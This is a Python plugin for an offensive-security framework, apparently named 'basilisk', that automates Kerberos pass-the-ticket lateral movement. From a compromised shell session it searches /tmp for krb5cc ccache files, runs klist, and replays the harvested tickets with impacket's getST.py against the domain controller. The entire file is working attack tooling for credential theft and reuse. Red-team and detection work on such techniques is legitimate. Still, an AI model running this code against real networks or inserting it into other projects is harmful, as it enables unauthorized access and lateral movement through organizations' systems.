"""Pass-the-Ticket — Kerberos ticket reuse for lateral movement."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)


class PassTheTicketPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="pass_the_ticket",
        display_name="Pass-the-Ticket",
        category=PluginCategory.LATERAL,
        description="Kerberos TGT/TGS ticket reuse for lateral movement",
        produces=["lateral_access"],
        timeout=60.0,
        requires_http=False,
        requires_credentials=True,
        risk_level="noisy",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {"tickets_found": [], "tickets_used": []}

        # Check for Kerberos tickets in credential store
        if ctx.creds:
            ticket_creds = ctx.creds.get_by_type("kerberos_ticket")
            data["tickets_found"] = [
                {"username": c.username, "source": c.source}
                for c in ticket_creds
            ]

        # Check for ccache files on compromised host
        shells = ctx.state.get("active_shells", [])
        if shells and ctx.shell:
            session = (
                ctx.shell.get_session(shells[0]["id"])
                if isinstance(shells[0], dict) else None
            )
            if session:
                # Find ccache files
                ccache_search = await ctx.shell.execute(
                    session,
                    "find /tmp -name 'krb5cc_*' 2>/dev/null; "
                    "echo $KRB5CCNAME 2>/dev/null",
                    timeout=10.0,
                )
                if ccache_search:
                    for line in ccache_search.strip().splitlines():
                        if line.strip() and "krb5cc" in line:
                            data["tickets_found"].append({
                                "path": line.strip(), "source": "filesystem",
                            })

                # Try klist
                klist = await ctx.shell.execute(
                    session, "klist 2>/dev/null", timeout=5.0,
                )
                if klist and "Principal" in klist:
                    findings.append(Finding.high(
                        "Active Kerberos tickets found",
                        evidence=klist[:500],
                        description="Can be exported and reused for lateral movement",
                        tags=["lateral", "kerberos", "ticket"],
                    ))

        if not data["tickets_found"]:
            findings.append(Finding.info(
                "No Kerberos tickets found for pass-the-ticket",
                tags=["lateral", "kerberos"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        # Try to use tickets via impacket
        domain = target.meta.get("ad_domain", "")
        if ctx.subprocess_mgr and domain and data["tickets_found"]:
            for ticket in data["tickets_found"][:3]:
                if ctx.should_stop:
                    break
                ticket_path = ticket.get("path", "")
                if not ticket_path:
                    continue

                # Export and convert ticket
                cmd = (
                    f"KRB5CCNAME={ticket_path} "
                    f"getST.py -k -no-pass {domain}/ "
                    f"-dc-ip {target.host}"
                )
                result = await ctx.subprocess_mgr.run(cmd, timeout=15)
                if result.returncode == 0:
                    data["tickets_used"].append(ticket)
                    findings.append(Finding.critical(
                        f"Pass-the-Ticket success with {ticket_path}",
                        evidence=result.stdout[:300] if result.stdout else "",
                        tags=["lateral", "kerberos", "ptt"],
                    ))

        if data["tickets_found"] and not data["tickets_used"]:
            findings.append(Finding.medium(
                f"Kerberos tickets found but not usable: {len(data['tickets_found'])}",
                evidence="\n".join(
                    str(t) for t in data["tickets_found"][:10]
                ),
                tags=["lateral", "kerberos"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
